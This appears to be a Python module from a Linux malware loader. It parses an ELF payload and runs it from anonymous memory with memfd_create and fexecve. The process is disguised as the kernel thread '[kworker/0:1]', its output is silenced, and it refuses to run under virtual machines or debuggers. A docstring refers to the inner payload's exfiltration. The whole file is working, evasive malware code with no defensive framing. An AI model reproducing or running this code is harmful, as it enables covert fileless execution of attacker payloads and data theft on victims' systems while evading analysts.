# -*- coding: utf-8 -*-
"""
Worker — ELF parsing and memfd execution primitives.
Linux x86_64 only.

Silent by default: forked child's stdout/stderr are redirected to
/dev/null. Set SVC_DEBUG=1 to preserve them.
"""
import ctypes
import os
import struct
import sys


# ────────────────────────────────────────────────────────────────
# ELF parsing
# ────────────────────────────────────────────────────────────────

def parse_elf(data: bytes):
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return None
    if data[4] != 2 or data[5] != 1:
        return None
    e_type, e_machine, e_version, e_entry = struct.unpack_from("<HHIQ", data, 0x10)
    if e_machine != 0x3E:
        return None
    return {
        "type": e_type,
        "machine": e_machine,
        "version": e_version,
        "entry": e_entry,
        "size": len(data),
    }


# ────────────────────────────────────────────────────────────────
# Environment guards
# ────────────────────────────────────────────────────────────────

def is_vm() -> bool:
    try:
        p = "/sys/class/dmi/id/product_name"
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                name = f.read().strip().lower()
            for m in ("vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v"):
                if m in name:
                    return True
        with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as f:
            if " hypervisor" in f.read():
                return True
    except Exception:
        pass
    return False


def is_debugged() -> bool:
    try:
        with open("/proc/self/status", "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    return int(line.split()[1]) != 0
    except Exception:
        pass
    return False


# ────────────────────────────────────────────────────────────────
# Environment passthrough
# ────────────────────────────────────────────────────────────────

def _build_envp():
    """
    Snapshot os.environ into a C-compatible envp array.

    Returns (envp_array, keepalive_list). Caller must keep the list
    alive until after execve/fexecve — otherwise the child gets
    dangling pointers into freed Python bytes.

    The stub passes `environ` through to the inner svc-payload. If
    this envp is empty, the payload runs with no SVC_* vars and exfil
    silently no-ops.
    """
    env_bytes = [f"{k}={v}".encode() for k, v in os.environ.items()]
    arr = (ctypes.c_char_p * (len(env_bytes) + 1))()
    for i, e in enumerate(env_bytes):
        arr[i] = e
    arr[len(env_bytes)] = None
    return arr, env_bytes


# ────────────────────────────────────────────────────────────────
# memfd execution
# ────────────────────────────────────────────────────────────────

def _memfd_exec(payload: bytes) -> bool:
    if sys.platform != "linux":
        return False
    try:
        pid = os.fork()
    except OSError:
        return False
    if pid != 0:
        return True

    # Child
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.memfd_create.restype = ctypes.c_int
        libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
        libc.fexecve.restype = ctypes.c_int
        libc.fexecve.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p),
                                 ctypes.POINTER(ctypes.c_char_p)]

        name = b"[kworker/0:1]"
        fd = libc.memfd_create(name, 0)
        if fd < 0:
            os._exit(1)

        view = memoryview(payload)
        written = 0
        while written < len(payload):
            try:
                n = os.write(fd, view[written:])
            except OSError:
                os._exit(1)
            if n <= 0:
                os._exit(1)
            written += n

        if not os.environ.get("SVC_DEBUG"):
            devnull = os.open(os.devnull, os.O_WRONLY)
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            os.close(devnull)

        envp, _keep = _build_envp()
        argv = (ctypes.c_char_p * 2)(name, None)

        try:
            libc.fexecve(fd, argv, envp)
        except Exception:
            pass

        try:
            os.execve(f"/proc/self/fd/{fd}", [name.decode()], os.environ)
        except Exception:
            os._exit(1)
    except Exception:
        pass
    os._exit(1)


# ────────────────────────────────────────────────────────────────
# Public entry point
# ────────────────────────────────────────────────────────────────

def process_data(data: bytes) -> bool:
    """Validate, guard, and dispatch an ELF payload."""
    try:
        if not parse_elf(data):
            return False
        if is_vm():
            return False
        if is_debugged():
            return False
        return _memfd_exec(data)
    except Exception:
        return False
